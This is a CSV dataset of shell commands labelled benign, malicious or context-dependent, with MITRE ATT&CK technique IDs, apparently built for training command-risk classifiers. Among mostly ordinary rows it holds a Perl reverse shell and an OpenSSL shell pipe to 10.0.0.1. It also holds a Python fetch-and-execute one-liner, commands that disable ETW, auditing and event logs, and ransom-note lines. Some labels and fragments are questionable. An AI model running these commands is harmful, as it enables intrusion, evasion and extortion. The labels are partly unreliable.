command,label,original_label,mitre_id
systemctl is-active firewalld,Context_Dependent,Synthetic,Synthetic
x tping host,Benign,Benign,Benign
"dolt commit --author ""author_name <author_email>""",Benign,Benign,Benign
rsync -r --verbose --exclude 'exclude_pattern' ./* /to/where/,Benign,Benign,Benign
tar cf /path/to/temp-file.tar /path/to/temp-file,Malicious,Malicious,T1222
find . -type f -exec md5sum {} \; > MD5SUMS,Benign,Benign,Benign
tr -cs '[:space:]',Benign,Benign,Benign
timg video.mp4,Benign,Benign,Benign
"phpmd path/to/file_or_directory xml|text|html ruleset1,ruleset2,... --reportfile path/to/report_file",Benign,Benign,Benign
var URL = Java.type('java.net.URL');,Malicious,Malicious,T1105
rabbitmqctl set_permissions [-p|--vhost] vhost_name username read write configure,Benign,Benign,Benign
register_new_matrix_user --config path/to/homeserver.yaml --admin,Benign,Benign,Benign
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",Malicious,Malicious,T1562
curlie httpbin.org/get,Benign,Benign,Benign
bluetoothctl devices,Benign,Benign,Benign
find . | xargs -I'{}' mv '{}' ~/play/,Benign,Benign,Benign
/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.,Malicious,Malicious,T1554
userdbctl user username,Benign,Benign,Benign
csc /out:path/to/file path/to/input_file.cs,Benign,Benign,Benign
Remove-AppxPackage package -PreserveApplicationData,Benign,Benign,Benign
WSearch,Malicious,Malicious,T1543
screenkey,Benign,Benign,Benign
ssh-copy-id -i path/to/certificate username@remote_host,Benign,Benign,Benign
xwinwrap -b -nf -fs -ov -- mpv --wid wid --loop --no-audio --no-resume-playback --panscan=1.0 path/to/video.mp4,Benign,Benign,Benign
sudo userdel [-R|--root] path/to/other_root username,Benign,Benign,Benign
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
aws sqs list-queues,Benign,Benign,Benign
sudo grub-install --target x86_64-efi --efi-directory path/to/efi_directory --bootloader-id GRUB,Benign,Benign,Benign
"kiterunner brute https://example.com [-w|--wordlist] path/to/dirsearch.txt [-D|--dirsearch-compat] [-e|--extensions] json,txt",Benign,Benign,Benign
cd %userprofile%,Benign,Benign,Benign
echo -n 111-11-1111 | base64,Malicious,Malicious,T1132
uptime [-V|--version],Benign,Benign,Benign
rabbitmq-queues delete_member queue node,Benign,Benign,Benign
scan-build,Benign,Benign,Benign
spctl --master-enable,Benign,Benign,Benign
MOUNT D D:\ -t cdrom -usecd 0 -ioctl,Context_Dependent,Benign,Benign
__tutma,Malicious,Malicious,T1071
openocd [-f|--file] config_file1.cfg [-f|--file] config_file2.cfg,Benign,Benign,Benign
"history | awk '{sub($1, """", $0); sub(/^[ \t]+/, """", $0); print}'",Context_Dependent,Benign,Benign
tcpdump -i wlan0 -nn,Context_Dependent,Synthetic,Synthetic
"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",Context_Dependent,Malicious,T1082
screen -R -O -t mysession -S mysession -f,Benign,Benign,Benign
gst-launch-1.0 libcamerasrc camera-name=camera_name ! videoconvert ! autovideosink,Benign,Benign,Benign
find . -type f -exec perl -i -pe 's/something/another/g' {} \;,Benign,Benign,Benign
lib /LIST path\to\library.lib,Benign,Benign,Benign
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",Malicious,Malicious,T1218
sui client gas address,Benign,Benign,Benign
cd /,Benign,Benign,Benign
ipsumdump --src --dst --length --anonymize path/to/file.pcap,Benign,Benign,Benign
"cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" $remote_file $destination_path",Malicious,Malicious,T1105
sesearch --allow [-c|--class] class_name [-p|--perm] permission,Benign,Benign,Benign
dot_clean -v path/to/directory,Benign,Benign,Benign
cargo rustc --lib -- -D unsafe-code,Benign,Benign,Benign
wp config create --dbname=dbname --dbuser=dbuser --dbpass=dbpass,Benign,Benign,Benign
cot path/to/file1 path/to/file2 ...,Benign,Benign,Benign
perldoc -L language_code page|module|program|URL,Benign,Benign,Benign
crane index subcommand,Benign,Benign,Benign
dnsx <<< example.com -recon [-re|-resp],Benign,Benign,Benign
cipher /d:path\to\file_or_directory,Benign,Benign,Benign
"mail --subject ""subject line"" to_user@example.com --cc ""cc_email_address""",Benign,Benign,Benign
fdroidcl download app_id,Benign,Benign,Benign
Rscript --vanilla path/to/file.R,Benign,Benign,Benign
subst Z: /d,Benign,Benign,Benign
cat $File_to_output,Context_Dependent,Malicious,T1083
calibredb add path/to/file1 path/to/file2 ...,Benign,Benign,Benign
sudo btrfs [i|inspect-internal] [i|inode-resolve] n path/to/btrfs_mount,Benign,Benign,Benign
transmission-edit [-d|--delete] http://example.com path/to/file.torrent,Benign,Benign,Benign
sudo btrfs [qu|quota] [e|enable] path/to/subvolume,Benign,Benign,Benign
find . -type f | xargs | wc -c,Benign,Benign,Benign
slurp -p,Benign,Benign,Benign
figlet -t -c input_text,Benign,Benign,Benign
"notify-send [-i|--icon] icon.png ""Test"" ""This is a test""",Benign,Benign,Benign
arjun -u https://example.com -w path/to/wordlist.txt,Benign,Benign,Benign
ibmcloud target -g resource_group_name,Benign,Benign,Benign
"test -f ""path/to/file_or_directory""",Benign,Benign,Benign
cat $filename | rev | cut -c 3- | rev,Benign,Benign,Benign
TracerPID,Context_Dependent,Malicious,T1622
pstopnm -dpi n path/to/file.ps,Benign,Benign,Benign
gst-launch-1.0 source ! pipewiresink client-name=node_name,Benign,Benign,Benign
stress [-d|--hdd] 2 --hdd-bytes 1GB,Benign,Benign,Benign
if exist path\to\file (echo Condition is true),Benign,Benign,Benign
"echo ""Hi friends"" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
"sort -u -t, -k1,1 file",Benign,Benign,Benign
InstallLanguage,Context_Dependent,Malicious,T1614
sudo squid -N,Benign,Benign,Benign
paccheck --quiet,Benign,Benign,Benign
Get-Acl path\to\directory,Benign,Benign,Benign
lldb executable,Benign,Benign,Benign
peludna-prognoza,Benign,Benign,Benign
redis-server,Benign,Benign,Benign
wevtutil cl security,Malicious,Malicious,T1070
smalltalkci --clean,Benign,Benign,Benign
find . -mindepth 1 -maxdepth 1 -type d,Benign,Benign,Benign
sudo -n id,Context_Dependent,Synthetic,Synthetic
"cd ""`pwd -P`""",Benign,Benign,Benign
unalias word,Benign,Benign,Benign
az quantum target set [-t|--target-id] Id,Benign,Benign,Benign
%temp%\SMB\,Malicious,Malicious,T1074
ionic g page,Benign,Benign,Benign
gofumpt -w path/to/directory,Benign,Benign,Benign
rubocop,Benign,Benign,Benign
cat *.txt | wc -l,Benign,Benign,Benign
debsecan --suite release_code_name,Benign,Benign,Benign
compgen -c,Benign,Benign,Benign
"$which_python -c 'import requests;import os;url = ""$script_url"";malicious_command = ""$executor $payload_file_name $script_args"";session = requests.session();source = session.get(url).content;fd = open(""$payload_file_name"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'",Malicious,Malicious,T1059
"find . -name ""*.cpp"" | uncrustify -F - --replace",Benign,Benign,Benign
find /usr/local/svn/repos/ -maxdepth 1 -mindepth 1 -type d -exec echo /usr/local/backup{} \;,Benign,Benign,Benign
mhwd [-i|--install] pci|usb driver_name,Benign,Benign,Benign
pixi clean,Benign,Benign,Benign
Get-MsolRole,Context_Dependent,Malicious,T1069
find . -size +270M -size -300M,Benign,Benign,Benign
nix why-depends --derivation nixpkgs#dependent nixpkgs#dependency,Benign,Benign,Benign
nikto -h http://10.0.0.10,Context_Dependent,Synthetic,Synthetic
pip lock [-r|--requirement] path/to/requirements.txt,Benign,Benign,Benign
find /myDir -mindepth 1 -mtime +7 -delete,Benign,Benign,Benign
find . -type f -amin +10,Benign,Benign,Benign
Install-Module module -MinimumVersion minimum_version -MaximumVersion maximum_version,Benign,Benign,Benign
nl file | sort -nr | cut -b8-,Benign,Benign,Benign
screen,Benign,Benign,Benign
macchina,Benign,Benign,Benign
attrib.exe -r $file_or_folder\*.* /s,Malicious,Malicious,T1222
jj git fetch --remote remote,Benign,Benign,Benign
eselect repository remove repo1 repo2 ...,Benign,Benign,Benign
hg add path/to/file,Benign,Benign,Benign
pulumi cancel stack_name,Benign,Benign,Benign
duc ls [-Fg|--classify --graph] [-R|--recursive] /usr/local,Benign,Benign,Benign
unshare,Malicious,Malicious,T1611
netsh interface portproxy show all,Benign,Benign,Benign
find lpi104-6 -samefile lpi104-6/file1,Benign,Benign,Benign
uv self version,Benign,Benign,Benign
comm -23 second-file-sorted.txt first-file-sorted.txt,Benign,Benign,Benign
zeroclaw channel start,Benign,Benign,Benign
tar -I pbzip2 -cf OUTPUT_FILE.tar.bz2 /DIR_TO_ZIP/,Benign,Benign,Benign
Limit,Malicious,Malicious,T1218
sfdk config name=value,Benign,Benign,Benign
gradle wrapper --distribution-type bin|all,Benign,Benign,Benign
autorandr [-d|--default] profile_name,Benign,Benign,Benign
istats,Benign,Benign,Benign
find $root -type d | tr '\n' ':',Benign,Benign,Benign
theHarvester --domain domain_name --source google --limit 200,Benign,Benign,Benign
driverquery /v /fo list,Malicious,Malicious,T1652
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore",Malicious,Malicious,T1070
docker compose up --build,Benign,Benign,Benign
m bluetooth off,Benign,Benign,Benign
"ren ""%temp%\upload"" audiodg.exe",Malicious,Malicious,T1036
qm [clou|cloudinit] [d|dump] virtual_machine_id meta|network|user,Benign,Benign,Benign
find . -name '*foo*' -exec ls -lah {} \;,Benign,Benign,Benign
sts:GetFederationToken,Malicious,Malicious,T1098
kdesrc-build component_name,Benign,Benign,Benign
waitress-serve --threads=4 import.path:wsgifunc,Benign,Benign,Benign
aws s3 rm s3://bucket/path/to/file,Benign,Benign,Benign
firebase projects:list,Benign,Benign,Benign
docker [pull|image pull] image:tag,Benign,Benign,Benign
kexec [-u|--unload],Benign,Benign,Benign
{ time sleep 1; } 2>&1 | grep real,Benign,Benign,Benign
find . -amin 10,Benign,Benign,Benign
treemd --tree path/to/file.md,Benign,Benign,Benign
prettier --check path/to/file,Benign,Benign,Benign
lstopo --no-factorize,Benign,Benign,Benign
mvn site [-D|--define] skipTests,Benign,Benign,Benign
tldr todo,Benign,Benign,Benign
pod deintegrate xcode_project,Benign,Benign,Benign
addcomputer.py -dc-host hostname domain/username:password,Benign,Benign,Benign
"electron-packager ""path/to/app"" ""app_name"" --platform=""darwin"" --arch=""arm64""",Benign,Benign,Benign
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*,Malicious,Malicious,T1567
ssh -t SERVER 'command; bash -l',Benign,Benign,Benign
yes $1 | head -$number,Benign,Benign,Benign
"write-output ""------------""| out-file $output_file -append",Context_Dependent,Malicious,T1012
sxiv -t path/to/image1 path/to/image2 ...,Benign,Benign,Benign
tox [-r|--recreate] -e py27,Benign,Benign,Benign
"Write-Host ""Process Name: $processName)""",Malicious,Malicious,T1562
sudo pdbedit [-L|--list] [-v|--verbose],Benign,Benign,Benign
yadm enter,Benign,Benign,Benign
systemctl kexec,Benign,Benign,Benign
sockstat -jv,Benign,Benign,Benign
yadm perms,Benign,Benign,Benign
sui move build --path path,Benign,Benign,Benign
xfce4-screenshooter [-f|--fullscreen],Benign,Benign,Benign
find <directory> -type f -size -1M -print0 | xargs -0 rm,Benign,Benign,Benign
kubectl config current-context,Benign,Benign,Benign
head -16482 in.sql | tail -258 > out.sql,Benign,Benign,Benign
envoy init host_name,Benign,Benign,Benign
acpi [-c|--cooling],Benign,Benign,Benign
uv publish [-t|--token] your_api_token,Benign,Benign,Benign
git pull remote_name branch,Benign,Benign,Benign
rpm-ostree status,Benign,Benign,Benign
zmap [-S|--source-ip] source_ip SUBNETS,Context_Dependent,Benign,Benign
find . -group root -print | xargs chgrp temp,Benign,Benign,Benign
swig -go -cgo -intgosize 64 -c++ path/to/swig_file.i,Benign,Benign,Benign
certutil -K -d . -f path/to/password_file.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 10.0.0.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
mate-screenshot --window,Benign,Benign,Benign
ROPgadget --binary path/to/binary --re regex,Benign,Benign,Benign
gobuster s3 [-w|--wordlist] path/to/file,Benign,Benign,Benign
debtap [-q|--quiet] path/to/package.deb,Benign,Benign,Benign
find /path/to/base/dir -type d -print0 | xargs -0 chmod 755,Benign,Benign,Benign
find . -type f -name '*.php' -exec chmod 644 {} \;,Benign,Benign,Benign
hwclock,Context_Dependent,Synthetic,Synthetic
ufraw-batch --out-type=jpg input_file(s),Benign,Benign,Benign
hatch clean,Benign,Benign,Benign
kwrite path/to/file,Benign,Benign,Benign
cat -v /dev/urandom,Benign,Benign,Benign
gofmt -s -w source.go,Benign,Benign,Benign
sonar-scanner [-h|--help],Benign,Benign,Benign
grumphp git:init,Benign,Benign,Benign
procdump.exe -md {PATH:.dll} foobar,Malicious,Malicious,T1202
fusermount -u path/to/mount_point,Benign,Benign,Benign
bssh,Benign,Benign,Benign
echo 'ee' | tee >(foo),Benign,Benign,Benign
exo compute block-storage list,Benign,Benign,Benign
ncspot [-c|--config] file_name,Benign,Benign,Benign
ego sync,Benign,Benign,Benign
qm list --full 1,Benign,Benign,Benign
ouch decompress path/to/archive1.tar path/to/archive2.tar.gz ...,Benign,Benign,Benign
aurpublish package_name,Benign,Benign,Benign
createuser --interactive username,Benign,Benign,Benign
tb [-m|--move] @item_id board_name,Benign,Benign,Benign
nitrogen --set-auto path/to/file,Benign,Benign,Benign
df -k /dir/inner_dir/,Benign,Benign,Benign
kahlan --coverage=detail_level,Benign,Benign,Benign
kubectl get [-f|--filename] path/to/manifest.yaml,Context_Dependent,Benign,Benign
interactiveMode: Always,Malicious,Malicious,T1059
tldr ykman openpgp,Benign,Benign,Benign
hr string1 string2 ...,Benign,Benign,Benign
mbw -n 3 -q -a 512,Benign,Benign,Benign
cmd.exe /c del,Malicious,Malicious,T1070
path/to/factorio --create path/to/save.zip --map-gen-settings path/to/map_gen_settings.json --map-settings path/to/map_settings.json,Benign,Benign,Benign
"paste -sd',,\n' file",Benign,Benign,Benign
comm -12 <(find ~/bin/FilesDvorak/.* -maxdepth 0) <(find ~/.PAST_RC_files/.*),Benign,Benign,Benign
betty version,Benign,Benign,Benign
ccomps -v -s path/to/input1.gv path/to/input2.gv ...,Benign,Benign,Benign
"auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable",Malicious,Malicious,T1562
bosh [-e|--environment] environment vms [-d|--deployment] deployment,Benign,Benign,Benign
clang-format --style LLVM|GNU|Google|Chromium|Microsoft|Mozilla|WebKit path/to/file,Benign,Benign,Benign
"nl -n rz ca | awk -vOFS=""\t"" '/Ca/{$1=""#""$2} {$1=$1}1' | sort -k1,1 | cut -f2-",Benign,Benign,Benign
grex [-f|--file] path/to/file,Benign,Benign,Benign
echo 1> /proc/sys/kernel/sysrq,Malicious,Malicious,T1562
tuckr rm \*,Benign,Benign,Benign
Set-ADAccountPassword,Malicious,Malicious,T1531
apptainer build path/to/image.sif docker://image:tag,Benign,Benign,Benign
systemd-cat command,Benign,Benign,Benign
dunst -print,Benign,Benign,Benign
cargo metadata --format-version version,Benign,Benign,Benign
wev -M path/to/file,Benign,Benign,Benign
Crash,Malicious,Malicious,T1218
links -enable-cookies 0|1 https://example.com,Benign,Benign,Benign
dracut --kver kernel_version,Benign,Benign,Benign
env | sed 's/;/\\;/g',Context_Dependent,Benign,Benign
"exif --ifd 0 [-t|--tag] ""Model"" [-m|--machine-readable] path/to/image.jpg",Benign,Benign,Benign
"find . -name ""file-containing-can't"" -exec grep ""can't"" '{}' \; -print",Benign,Benign,Benign
lynx -color example.com,Benign,Benign,Benign
msgfmt path/to/file.po [-o|--output-file] path/to/file.mo,Benign,Benign,Benign
"find temp/medium/* -maxdepth 2 -iname ""*.jpg"" -print0 | xargs -0 mogrify -resize 428x270"">"" -quality 80 -compress JPEG -monitor -strip",Benign,Benign,Benign
grc --pty /bin/sh,Malicious,Malicious,T1059
sudo ip [r|route] [a|add] default dev ethX,Benign,Benign,Benign
soffice --convert-to pdf *.doc,Benign,Benign,Benign
plasma-apply-wallpaperimage /path/to/image,Benign,Benign,Benign
unison path/to/directory_1 path/to/directory_2 -auto,Benign,Benign,Benign
csv2tsv -c';' path/to/input_csv,Benign,Benign,Benign
sacct [-j|--jobs] job_id [-X|--allocations],Benign,Benign,Benign
az ad user get-member-groups,Context_Dependent,Malicious,T1069
shnsplit -f path/to/file.cue -o flac path/to/file.flac,Benign,Benign,Benign
n bin version,Benign,Benign,Benign
balooctl purge,Benign,Benign,Benign
tldr rc,Benign,Benign,Benign
env - `cat ~/cronenv` /bin/sh,Benign,Benign,Benign
ng analytics [on|enable] [-g|--global],Benign,Benign,Benign
apx stacks list,Benign,Benign,Benign
latexmk -dvi /path/to/temp-file,Context_Dependent,Malicious,T1005
"wl-copy --paste-once ""text""",Benign,Benign,Benign
ssh-keyscan -p port hostname,Benign,Benign,Benign
strip-nondeterminism --type filetype path/to/file,Benign,Benign,Benign
elasticsearch-saml-metadata --realm realm_name --out path/to/file.xml,Benign,Benign,Benign
bob list,Benign,Benign,Benign
ip address dhcp,Benign,Benign,Benign
"apptainer push [-D|--description] ""description"" path/to/image.sif library://user/collection/container:tag",Benign,Benign,Benign
git reflog [-n|--max-count] 5,Benign,Benign,Benign
curl -s http://search.twitter.com/search.json?q=node.js | json,Benign,Benign,Benign
base32 [-w|--wrap] 0|76|... path/to/file,Benign,Benign,Benign
pacrepairdb --help,Benign,Benign,Benign
highlight [-o|--out-format] html [-s|--style] theme_name [-S|--syntax] language path/to/source_code,Benign,Benign,Benign
find /var/www -maxdepth 4 -name 'restore.php' -exec rm -r {} \;,Benign,Benign,Benign
find / -name document -print,Context_Dependent,Benign,Benign
find . -follow -inum 41525360,Benign,Benign,Benign
mux -c muxer_name1 muxer_name2 ...,Benign,Benign,Benign
"pkill [-f|--full] ""command_name""",Benign,Benign,Benign
ipconfig /all >> %temp%\download,Context_Dependent,Malicious,T1016
find . -type f -maxdepth 1 -not -empty -print0 | xargs -0i cp /dev/null {},Benign,Benign,Benign
distrobox-upgrade container_name,Benign,Benign,Benign
fio --filename=path/to/file --direct=1 --rw=randread --bs=4k --ioengine=libaio --iodepth=256 --runtime=120 --numjobs=4 --time_based --group_reporting --name=job_name --eta-newline=1 --readonly,Benign,Benign,Benign
mocha [-R|--reporter] reporter,Benign,Benign,Benign
"echo ""2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
markdown2pdf [-s|--string] markdown_text [-o|--output] path/to/output_file.pdf,Benign,Benign,Benign
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,Malicious,Malicious,T1202
setx variable value /M,Benign,Benign,Benign
fprintd-enroll --help,Benign,Benign,Benign
standard --fix,Benign,Benign,Benign
"pkcs11-tool --slot slot_id [-p|--pin] auth_pin [-y|--type] cert|privkey|pubkey|secrkey|data|... [-a|--label] ""label"" [-b|--delete-object]",Benign,Benign,Benign
find . -mtime -1 ! -name '.DS_Store' -type f -printf '%f\n',Benign,Benign,Benign
"find /home/you -iname ""*.mp3"" -daystart -type f -mtime 1",Context_Dependent,Benign,Benign
"find . -name ""*.andnav"" | rename -vn ""s/\.andnav$/.tile/""",Benign,Benign,Benign
emulator -avd name -webcam-list,Benign,Benign,Benign
g++ omnitest.cpp -E | less,Benign,Benign,Benign
system_profiler -detailLevel level,Benign,Benign,Benign
tldr cal,Benign,Benign,Benign
docker [exec|container exec] [-d|--detach] container_name command,Benign,Benign,Benign
$handle | get-member -erroraction silentlycontinue | out-file $output_file -append,Context_Dependent,Malicious,T1012
sudo trace-cmd record --max-graph-depth depth,Benign,Benign,Benign
find `pwd` -name file.ext |xargs -l1 dirname,Benign,Benign,Benign
cpdf -list-bookmarks path/to/document.pdf,Benign,Benign,Benign
chkdsk volume /f,Benign,Benign,Benign
xxd input_file output_file,Benign,Benign,Benign
lpmove -h server job_id new_printer,Benign,Benign,Benign
launchctl unload,Malicious,Malicious,T1569
smbclient //server/share,Benign,Benign,Benign
yara [-p|--threads] number_of_threads path/to/rule.yar path/to/directory,Benign,Benign,Benign
find . -mtime 4 -daystart -exec cp -a {} /home/devnet/fileshare\$ on\ X.X.X.X/RECOVER/ \;,Benign,Benign,Benign
find . -type f -iname '*.jpg' -print0 | du -c --files0-from=-,Benign,Benign,Benign
mcookie [-f|--file] path/to/file,Benign,Benign,Benign
cage -s application,Benign,Benign,Benign
"find /store/01 -name ""*.fits"" -exec chmod -x+r {} \; -exec ls -l {} \; | tee ALL_FILES.LOG",Benign,Benign,Benign
lualatex -jobname=filename path/to/file.tex,Benign,Benign,Benign
"while :; do continue; echo ""This will never be reached""; done",Benign,Benign,Benign
acountry -d example.com,Benign,Benign,Benign
"sudo parted /dev/sdX [-s|--script] mklabel gpt mkpart ""boot_partition_name"" 0% 500MiB mkpart ""system_partition_name"" 500MiB 100%",Benign,Benign,Benign
sam package,Benign,Benign,Benign
systemctl reset-failed,Benign,Benign,Benign
find $HOME -mtime +365,Benign,Benign,Benign
magick montage path/to/image1.jpg path/to/image2.jpg ... -geometry 640x480+0+0 path/to/montage.jpg,Benign,Benign,Benign
gphoto2 [-L|--list-files],Benign,Benign,Benign
winget [ls|list] [-s|--source] winget,Benign,Benign,Benign
gzip --help | less,Benign,Benign,Benign
poetry new path/to/directory --name package_name,Benign,Benign,Benign
"echo ""password"" | argon2 ""salt_text""",Benign,Benign,Benign
sudo code --user-data-dir path/to/directory,Benign,Benign,Benign
c:close();,Malicious,Malicious,T1105
find /home/backups -type f -iregex '.*\.t?gz$' -mtime +60 -exec rm {} \;,Context_Dependent,Benign,Benign
esbuild --bundle --serve=port --outfile=index.js path/to/file.js,Benign,Benign,Benign
top -b -n1 -c,Context_Dependent,Benign,Benign
apt list package,Benign,Benign,Benign
systemd-id128 invocation-id,Benign,Benign,Benign
pprof ./fibbo ./fibbo-profile.pb.gz,Benign,Benign,Benign
qmrestore path/to/vzdump-qemu-100.vma.lzo 100,Benign,Benign,Benign
luatex -shell-escape '\directlua{...}\end',Malicious,Malicious,T1548
babel path/to/input_directory,Benign,Benign,Benign
lazydocker --file path/to/docker-compose.yml,Benign,Benign,Benign
pnmtops [-imagew|-imagewidth] imagewidth [-imageh|-imageheight] imageheight path/to/file.pnm > path/to/file.ps,Benign,Benign,Benign
hydra -C path/to/username_password_pairs.txt imap://[host_range_cidr],Benign,Benign,Benign
rclone copy path/to/source_file_or_directory remote_name:path/to/directory,Benign,Benign,Benign
idnits --verbose path/to/file.txt,Benign,Benign,Benign
"feroxbuster --url ""https://example.com"" --filter-status 301 --filter-size 4092",Benign,Benign,Benign
systemctl kexec [-f|--force],Benign,Benign,Benign
x11vnc -shared,Benign,Benign,Benign
sudo compsize path/to/file_or_directory,Benign,Benign,Benign
chrt --deadline|idle|batch|rr|fifo|other [-p|--pid] priority PID,Benign,Benign,Benign
FAX,Context_Dependent,Malicious,T1007
sntpd -L,Benign,Benign,Benign
hardinfo [-r|--generate-report],Benign,Benign,Benign
pipx list,Benign,Benign,Benign
picgo upload,Benign,Benign,Benign
ethtool ens33,Context_Dependent,Synthetic,Synthetic
kpackagetool6 [-t|--type] package_type [-u|--upgrade] path/to/directory,Benign,Benign,Benign
ufw status numbered,Malicious,Malicious,T1562
networksetup -listallnetworkservices,Benign,Benign,Benign
history | grep ssh,Context_Dependent,Synthetic,Synthetic
"perl -e 'use Socket;$i=""10.0.0.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
octo create-release --project project_name --packageversion version,Benign,Benign,Benign
set -o history,Benign,Benign,Benign
"mpv --no-audio \`ls ~/Down/other/*.{mp4,flv} --color=never\`",Benign,Benign,Benign
gcloud init,Benign,Benign,Benign
"birdc ""show route where bgp_path ~ [4242120045]""",Benign,Benign,Benign
find / -name composer.json -exec grep -n drush {} /dev/null \;,Context_Dependent,Benign,Benign
kaggle [m|models] list,Benign,Benign,Benign
logread -e pattern,Benign,Benign,Benign
systemctl whoami --user,Benign,Benign,Benign
tcpdump -i ens33 port 80,Context_Dependent,Synthetic,Synthetic
cal | sed '1d;2{h;s/./ /g;x};/^\s*$/b;G;s/\n/ /;s/^...\(.\{15\}\).*/\1/;s/.../ &\t\&/g;s/\&$/\\\\/',Benign,Benign,Benign
poetry init,Benign,Benign,Benign
avrdude -p part_no -c programmer -U flash:w:file.hex,Benign,Benign,Benign
"sudo lsmod | grep -i ""xen-vbd\|xen-vnif""",Context_Dependent,Malicious,T1082
pveam [d|download] local template_name,Benign,Benign,Benign
argospm search --from-lang en,Benign,Benign,Benign
sshare --parsable|parsable2|json|yaml,Benign,Benign,Benign
krita path/to/image1 path/to/image2 ...,Benign,Benign,Benign
git apply --cache path/to/file,Benign,Benign,Benign
mpc next,Benign,Benign,Benign
zipcloak path/to/archive.zip [-O|--output-file] path/to/encrypted.zip,Benign,Benign,Benign
"krunvm delete ""image_name""",Benign,Benign,Benign
getent hosts,Context_Dependent,Synthetic,Synthetic
echo $(pwd)/$filename,Benign,Benign,Benign
pgmhist [-ma|-machine] path/to/image.pgm,Benign,Benign,Benign
ksh,Benign,Benign,Benign
patool search path/to/archive,Benign,Benign,Benign
kill `ps ax | grep 'python csp_build.py' | awk '{print $1}'`,Benign,Benign,Benign
conda doctor [-p|--prefix] path/to/environment,Benign,Benign,Benign
find . -exec printf '%s\0' {} \;,Benign,Benign,Benign
find / -type f -perm 0777 -print -exec chmod 755 {} \;,Context_Dependent,Benign,Benign
regsvr32.exe /s {PATH:.dll},Malicious,Malicious,T1218
sudo lid username,Benign,Benign,Benign
"$base64Strings | Set-Content ""$HOME\decoded.ps1""",Malicious,Malicious,T1001
crontab filename,Benign,Benign,Benign
"date -d ""yesterday 13:00"" '+%Y-%m-%d'",Benign,Benign,Benign
bcdboot C:\Windows,Benign,Benign,Benign
git delete-branch branch_name1 branch_name2 ...,Benign,Benign,Benign
csc.exe -out:{PATH:.exe} {PATH:.cs},Malicious,Malicious,T1127
pw-link [-lI|--links --id],Benign,Benign,Benign
exrex '[oO0](_)[oO0]',Benign,Benign,Benign
"sshpass -f path/to/file ssh -o StrictHostKeyChecking=no user@hostname ""command""",Benign,Benign,Benign
cat /etc/pam.d/common-auth,Context_Dependent,Synthetic,Synthetic
halt [-p|--poweroff],Benign,Benign,Benign
watch [-g|--chgexit] lsblk,Benign,Benign,Benign
palmtopnm path/to/file.palm > path/to/file.pnm,Benign,Benign,Benign
glib-compile-resources file.gresource.xml,Benign,Benign,Benign
vagrant halt [-f|--force],Benign,Benign,Benign
rfetch -D,Benign,Benign,Benign
chage -l postgres,Context_Dependent,Synthetic,Synthetic
comm -23 <(find dir1 | sed 's/dir1/\//'| sort) <(find dir2 | sed 's/dir2/\//'| sort) | sed 's/^\//dir1/',Benign,Benign,Benign
quarto create-project path/to/destination_directory --type website --template blog,Benign,Benign,Benign
